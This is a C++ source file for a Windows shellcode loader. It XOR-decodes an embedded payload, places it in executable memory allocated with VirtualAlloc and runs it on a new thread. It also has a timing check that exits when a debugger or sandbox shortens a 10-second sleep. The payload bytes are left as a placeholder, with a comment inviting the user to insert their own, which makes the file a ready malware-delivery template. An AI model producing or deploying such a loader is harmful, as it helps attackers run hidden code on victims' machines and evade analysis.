#include <windows.h>
#include <iostream>
#include <ctime>

// Constants for memory allocation flags
#define ALLOC_COMMIT_RESERVE 0x3000
#define ALLOC_EXECUTE_READWRITE 0x40

// Function to add a delay and detect potential debugging
void delay_execution() {
    // Step 1: Record the start time
    clock_t start_time = clock();

    // Pause execution for 10 seconds
    Sleep(10000);

    // Calculate elapsed time in seconds
    clock_t elapsed_time = clock() - start_time;
    double seconds = static_cast<double>(elapsed_time) / CLOCKS_PER_SEC;

    // Check if elapsed time is less than expected (indicating possible debugging)
    if (seconds < 9.5) {
        exit(0); // Terminate execution
    }
}

int main() {
    // Example shellcode payload (replace with your actual payload)
    unsigned char shellPayload[511] = {
        
        // ... full shellcode here ...
    };

    // Step 2: Decode the shellcode (XOR decryption with key 0xFA)
    for (size_t i = 0; i < sizeof(shellPayload); ++i) {
        shellPayload[i] ^= 0xFA; // XOR each byte with the key
    }

    // Step 3: Allocate memory for the shellcode
    LPVOID allocatedMemory = VirtualAlloc(
        NULL, sizeof(shellPayload), ALLOC_COMMIT_RESERVE, ALLOC_EXECUTE_READWRITE
    );
    if (allocatedMemory == NULL) {
        std::cerr << "Failed to allocate memory." << std::endl;
        return 1;
    }

    // Step 4: Copy the decoded shellcode into the allocated memory
    memcpy(allocatedMemory, shellPayload, sizeof(shellPayload));

    // Step 5: Execute the shellcode by creating a new thread
    HANDLE threadHandle = CreateThread(
        NULL, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, NULL, 0, NULL
    );
    if (threadHandle == NULL) {
        std::cerr << "Failed to create thread." << std::endl;
        return 1;
    }

    // Step 6: Wait for the thread to complete execution
    WaitForSingleObject(threadHandle, INFINITE);

    // The shellcode is now executed, and the thread has completed its task
    return 0;
}
